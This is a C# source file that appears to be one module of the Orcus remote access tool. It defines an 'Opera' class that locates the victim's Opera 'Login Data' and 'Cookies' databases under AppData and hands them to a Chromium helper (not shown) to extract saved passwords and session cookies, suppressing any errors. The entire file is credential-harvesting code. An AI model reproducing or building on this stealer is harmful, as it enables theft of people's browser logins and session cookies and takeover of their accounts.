using System;
using System.Collections.Generic;
using System.IO;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Opera
{
    internal class Opera : IPasswordRecovery, ICookieRecovery
    {
        const string ApplicationName = "Opera";

        public IEnumerable<RecoveredCookie> GetCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Cookies");
                return ChromiumBase.Cookies(datapath, ApplicationName);
            }
            catch (Exception)
            {
                return new List<RecoveredCookie>();
            }
        }

        public IEnumerable<RecoveredPassword> GetPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Opera Software\\Opera Stable\\Login Data");
                return ChromiumBase.Passwords(datapath, ApplicationName);
            }
            catch (Exception)
            {
                return new List<RecoveredPassword>();
            }
        }
    }
}